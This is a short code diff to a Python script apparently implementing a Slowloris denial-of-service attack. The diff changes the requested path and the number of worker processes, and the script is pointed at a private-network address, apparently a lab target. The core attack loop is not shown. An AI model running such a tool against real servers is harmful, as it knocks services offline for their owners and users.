@@ -8,7 +8,7 @@ def chunkify(seq, size):
     return (seq[pos:pos + size] for pos in range(0, len(seq), size))
 
 BASE_PAYLOAD = '\r\n'.join([
-    'GET / HTTP/1.1',
+    'GET /index.html HTTP/1.1',
     'Host: localhost:5000',
     'Cache-Control: no-cache',
     'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0',
@@ -55,7 +55,7 @@ def slowloris(target, port):
         #    time.sleep(5)
 
 if __name__ == '__main__':
-    t = 5
+    t = 4
     pool = Pool(processes=t)
     for _ in range(t):
         pool.apply_async(slowloris, ('192.168.1.129', 8888))
